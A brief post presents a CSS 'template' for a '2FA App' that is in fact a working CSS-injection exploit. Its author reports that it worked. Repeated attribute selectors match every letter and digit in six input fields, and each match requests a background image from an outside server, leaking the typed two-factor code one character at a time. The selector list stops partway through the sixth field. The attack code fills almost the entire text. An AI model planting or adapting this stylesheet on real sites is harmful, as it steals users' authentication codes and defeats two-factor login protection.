Maybe this was not so elegant...but it worked!

```
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FF66FF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
input[value=A]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=A"); }
input[value=B]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=B"); }
input[value=C]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=C"); }
input[value=D]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=D"); }
input[value=E]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=E"); }
input[value=F]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=F"); }
input[value=G]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=G"); }
input[value=H]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=H"); }
input[value=I]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=I"); }
input[value=J]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=J"); }
input[value=K]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=K"); }
input[value=L]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=L"); }
input[value=M]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=M"); }
input[value=N]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=N"); }
input[value=O]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=O"); }
input[value=P]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=P"); }
input[value=Q]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Q"); }
input[value=R]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=R"); }
input[value=S]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=S"); }
input[value=T]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=T"); }
input[value=U]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=U"); }
input[value=V]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=V"); }
input[value=W]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=W"); }
input[value=X]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=X"); }
input[value=Y]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Y"); }
input[value=Z]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Z"); }
input[value=a]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=a"); }
input[value=b]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=b"); }
input[value=c]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=c"); }
input[value=d]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=d"); }
input[value=e]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=e"); }
input[value=f]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=f"); }
input[value=g]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=g"); }
input[value=h]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=h"); }
input[value=i]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=i"); }
input[value=j]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=j"); }
input[value=k]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=k"); }
input[value=l]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=l"); }
input[value=m]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=m"); }
input[value=n]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=n"); }
input[value=o]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=o"); }
input[value=p]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=p"); }
input[value=q]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=q"); }
input[value=r]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=r"); }
input[value=s]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=s"); }
input[value=t]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=t"); }
input[value=u]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=u"); }
input[value=v]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=v"); }
input[value=w]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=w"); }
input[value=x]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=x"); }
input[value=y]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=y"); }
input[value=z]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=z"); }
input[value=0]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=0"); }
input[value=1]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=1"); }
input[value=2]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=2"); }
input[value=3]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=3"); }
input[value=4]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=4"); }
input[value=5]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=5"); }
input[value=6]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=6"); }
input[value=7]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=7"); }
input[value=8]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=8"); }
input[value=9]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=9"); }

input[value=A]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=A"); }
input[value=B]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=B"); }
input[value=C]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=C"); }
input[value=D]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=D"); }
input[value=E]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=E"); }
input[value=F]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=F"); }
input[value=G]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=G"); }
input[value=H]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=H"); }
input[value=I]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=I"); }
input[value=J]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=J"); }
input[value=K]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=K"); }
input[value=L]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=L"); }
input[value=M]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=M"); }
input[value=N]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=N"); }
input[value=O]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=O"); }
input[value=P]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=P"); }
input[value=Q]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Q"); }
input[value=R]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=R"); }
input[value=S]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=S"); }
input[value=T]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=T"); }
input[value=U]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=U"); }
input[value=V]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=V"); }
input[value=W]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=W"); }
input[value=X]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=X"); }
input[value=Y]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Y"); }
input[value=Z]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Z"); }
input[value=a]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=a"); }
input[value=b]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=b"); }
input[value=c]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=c"); }
input[value=d]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=d"); }
input[value=e]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=e"); }
input[value=f]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=f"); }
input[value=g]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=g"); }
input[value=h]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=h"); }
input[value=i]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=i"); }
input[value=j]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=j"); }
input[value=k]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=k"); }
input[value=l]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=l"); }
input[value=m]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=m"); }
input[value=n]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=n"); }
input[value=o]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=o"); }
input[value=p]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=p"); }
input[value=q]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=q"); }
input[value=r]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=r"); }
input[value=s]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=s"); }
input[value=t]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=t"); }
input[value=u]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=u"); }
input[value=v]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=v"); }
input[value=w]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=w"); }
input[value=x]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=x"); }
input[value=y]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=y"); }
input[value=z]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=z"); }
input[value=0]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=0"); }
input[value=1]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=1"); }
input[value=2]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=2"); }
input[value=3]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=3"); }
input[value=4]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=4"); }
input[value=5]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=5"); }
input[value=6]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=6"); }
input[value=7]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=7"); }
input[value=8]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=8"); }
input[value=9]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=9"); }

input[value=A]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=A"); }
input[value=B]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=B"); }
input[value=C]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=C"); }
input[value=D]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=D"); }
input[value=E]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=E"); }
input[value=F]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=F"); }
input[value=G]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=G"); }
input[value=H]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=H"); }
input[value=I]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=I"); }
input[value=J]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=J"); }
input[value=K]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=K"); }
input[value=L]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=L"); }
input[value=M]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=M"); }
input[value=N]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=N"); }
input[value=O]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=O"); }
input[value=P]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=P"); }
input[value=Q]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Q"); }
input[value=R]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=R"); }
input[value=S]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=S"); }
input[value=T]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=T"); }
input[value=U]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=U"); }
input[value=V]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=V"); }
input[value=W]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=W"); }
input[value=X]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=X"); }
input[value=Y]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Y"); }
input[value=Z]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Z"); }
input[value=a]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=a"); }
input[value=b]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=b"); }
input[value=c]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=c"); }
input[value=d]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=d"); }
input[value=e]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=e"); }
input[value=f]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=f"); }
input[value=g]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=g"); }
input[value=h]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=h"); }
input[value=i]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=i"); }
input[value=j]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=j"); }
input[value=k]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=k"); }
input[value=l]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=l"); }
input[value=m]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=m"); }
input[value=n]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=n"); }
input[value=o]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=o"); }
input[value=p]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=p"); }
input[value=q]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=q"); }
input[value=r]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=r"); }
input[value=s]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=s"); }
input[value=t]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=t"); }
input[value=u]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=u"); }
input[value=v]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=v"); }
input[value=w]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=w"); }
input[value=x]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=x"); }
input[value=y]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=y"); }
input[value=z]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=z"); }
input[value=0]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=0"); }
input[value=1]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=1"); }
input[value=2]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=2"); }
input[value=3]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=3"); }
input[value=4]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=4"); }
input[value=5]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=5"); }
input[value=6]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=6"); }
input[value=7]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=7"); }
input[value=8]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=8"); }
input[value=9]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=9"); }

input[value=A]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=A"); }
input[value=B]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=B"); }
input[value=C]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=C"); }
input[value=D]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=D"); }
input[value=E]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=E"); }
input[value=F]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=F"); }
input[value=G]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=G"); }
input[value=H]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=H"); }
input[value=I]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=I"); }
input[value=J]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=J"); }
input[value=K]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=K"); }
input[value=L]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=L"); }
input[value=M]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=M"); }
input[value=N]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=N"); }
input[value=O]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=O"); }
input[value=P]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=P"); }
input[value=Q]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Q"); }
input[value=R]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=R"); }
input[value=S]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=S"); }
input[value=T]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=T"); }
input[value=U]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=U"); }
input[value=V]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=V"); }
input[value=W]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=W"); }
input[value=X]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=X"); }
input[value=Y]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Y"); }
input[value=Z]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Z"); }
input[value=a]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=a"); }
input[value=b]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=b"); }
input[value=c]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=c"); }
input[value=d]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=d"); }
input[value=e]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=e"); }
input[value=f]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=f"); }
input[value=g]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=g"); }
input[value=h]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=h"); }
input[value=i]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=i"); }
input[value=j]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=j"); }
input[value=k]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=k"); }
input[value=l]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=l"); }
input[value=m]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=m"); }
input[value=n]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=n"); }
input[value=o]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=o"); }
input[value=p]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=p"); }
input[value=q]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=q"); }
input[value=r]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=r"); }
input[value=s]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=s"); }
input[value=t]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=t"); }
input[value=u]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=u"); }
input[value=v]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=v"); }
input[value=w]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=w"); }
input[value=x]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=x"); }
input[value=y]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=y"); }
input[value=z]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=z"); }
input[value=0]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=0"); }
input[value=1]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=1"); }
input[value=2]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=2"); }
input[value=3]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=3"); }
input[value=4]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=4"); }
input[value=5]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=5"); }
input[value=6]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=6"); }
input[value=7]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=7"); }
input[value=8]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=8"); }
input[value=9]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=9"); }

input[value=A]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=A"); }
input[value=B]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=B"); }
input[value=C]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=C"); }
input[value=D]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=D"); }
input[value=E]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=E"); }
input[value=F]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=F"); }
input[value=G]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=G"); }
input[value=H]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=H"); }
input[value=I]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=I"); }
input[value=J]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=J"); }
input[value=K]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=K"); }
input[value=L]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=L"); }
input[value=M]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=M"); }
input[value=N]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=N"); }
input[value=O]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=O"); }
input[value=P]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=P"); }
input[value=Q]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Q"); }
input[value=R]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=R"); }
input[value=S]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=S"); }
input[value=T]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=T"); }
input[value=U]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=U"); }
input[value=V]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=V"); }
input[value=W]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=W"); }
input[value=X]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=X"); }
input[value=Y]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Y"); }
input[value=Z]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Z"); }
input[value=a]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=a"); }
input[value=b]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=b"); }
input[value=c]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=c"); }
input[value=d]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=d"); }
input[value=e]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=e"); }
input[value=f]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=f"); }
input[value=g]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=g"); }
input[value=h]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=h"); }
input[value=i]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=i"); }
input[value=j]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=j"); }
input[value=k]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=k"); }
input[value=l]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=l"); }
input[value=m]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=m"); }
input[value=n]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=n"); }
input[value=o]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=o"); }
input[value=p]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=p"); }
input[value=q]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=q"); }
input[value=r]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=r"); }
input[value=s]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=s"); }
input[value=t]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=t"); }
input[value=u]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=u"); }
input[value=v]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=v"); }
input[value=w]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=w"); }
input[value=x]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=x"); }
input[value=y]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=y"); }
input[value=z]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=z"); }
input[value=0]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=0"); }
input[value=1]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=1"); }
input[value=2]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=2"); }
input[value=3]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=3"); }
input[value=4]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=4"); }
input[value=5]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=5"); }
input[value=6]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=6"); }
input[value=7]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=7"); }
input[value=8]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=8"); }
input[value=9]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=9"); }

input[value=A]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=A"); }
input[value=B]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=B"); }
input[value=C]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=C"); }
input[value=D]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=D"); }
input[value=E]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=E"); }
input[value=F]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=F"); }
input[value=G]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=G"); }
input[value=H]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=H"); }
input[value=I]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=I"); }
input[value=J]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=J"); }
input[value=K]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=K"); }
input[value=L]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=L"); }
input[value=M]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=M"); }
input[value=N]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=N"); }
input[value=O]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=O"); }
input[value=P]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=P"); }
input[value=Q]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Q"); }
input[value=R]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=R"); }
input[value=S]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=S"); }
input[value=T]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=T"); }
input[value=U]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=U"); }
input[value=V]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=V"); }
input[value=W]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=W"); }
input[value=X]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=X"); }
input[value=Y]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Y"); }
input[value=Z]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Z"); }
input[value=a]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=a"); }
input[value=b]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=b"); }
input[value=c]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=c"); }
input[value=d]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=d"); }
input[value=e]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=e"); }
input[value=f]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=f"); }
input[value=g]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=g"); }
input[value=h]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=h"); }
input[value=i]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=i"); }
input[value=j]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=j"); }
input[value=k]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=k"); }
input[value=l]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=l"); }
input[value=m]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=m"); }
input[value=n]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=n"); }
input[value=o]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=o"); }
input[value=p]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=p"); }
input[value=q]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=q"); }
